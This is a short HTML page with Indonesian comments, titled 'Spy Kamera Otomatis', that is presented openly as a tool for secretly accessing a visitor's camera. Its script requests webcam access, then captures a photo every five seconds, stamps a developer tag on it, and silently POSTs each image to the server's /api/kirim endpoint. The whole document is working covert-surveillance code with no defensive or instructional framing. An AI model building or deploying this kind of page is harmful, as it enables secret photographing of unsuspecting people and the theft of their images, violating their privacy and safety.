<!DOCTYPE html>
<html>
  <head>
    <title>Spy Kamera Otomatis</title>
  </head>
  <body>
    <h2>Akses Kamera Diam-diam</h2>
    <video id="video" autoplay playsinline width="320" height="240"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");
      let spamInterval;

      // Mengakses kamera pengguna
      navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
          video.srcObject = stream;

          // Mulai mengambil foto setiap 5 detik
          spamInterval = setInterval(() => {
            // Menggambar video ke canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Menambahkan teks "Dev By @FazrrEdan" pada gambar
            context.font = "20px Arial";  // Set font ukuran teks
            context.fillStyle = "rgba(0, 0, 0, 0.7)";  // Set warna teks
            context.fillText("Dev By @FazrrEdan", 10, 30);  // Posisi teks di atas gambar

            // Mengambil data gambar dengan teks
            const imageData = canvas.toDataURL("image/jpeg");

            // Mengirim gambar ke server
            fetch("/api/kirim", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ image: imageData }),
            });
          }, 5000); // ambil foto tiap 5 detik
        })
        .catch((err) => {
          alert("Gagal akses kamera: " + err);
        });

      // Hentikan spam foto jika pengguna keluar/menutup halaman
      window.addEventListener("beforeunload", () => {
        clearInterval(spamInterval);
      });
    </script>
  </body>
</html>
